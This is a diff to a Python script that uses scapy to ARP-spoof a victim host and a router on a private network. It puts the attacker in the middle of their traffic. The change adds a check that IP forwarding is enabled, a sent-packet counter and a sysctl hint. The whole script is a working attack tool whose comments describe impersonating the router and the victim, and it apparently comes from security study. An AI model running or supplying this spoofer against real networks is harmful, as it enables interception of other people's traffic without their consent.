@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 import time
+import subprocess
 import scapy.all as scapy
 
 
@@ -24,8 +25,14 @@ def spoof(target_ip, spoof_ip):
     return scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)  # , hwsrc="08:00:00:00:00:3c")
 
 
-while True:
-    scapy.send(spoof("192.168.180.9", "192.168.180.100"))  # telling the victim we're the router
-    scapy.send(spoof("192.168.180.100", "192.168.180.9"))  # telling the router we're the victim
-    time.sleep(2)
+if int(subprocess.run(["cat", "/proc/sys/net/ipv4/ip_forward"], capture_output=True).stdout.decode()) == 1:
+    sent_packets_count = 0
+    while True:
+        scapy.send(spoof("192.168.180.9", "192.168.180.100"))  # telling the victim we're the router
+        scapy.send(spoof("192.168.180.100", "192.168.180.9"))  # telling the router we're the victim
+        sent_packets_count = sent_packets_count + 2
+        print("[+] Packets sent: " + str(sent_packets_count))
+        time.sleep(2)
+else:
+    print("ip_forward is 0, modify it to 1. sysctl -w net.ipv4.ip_forward=1")
 
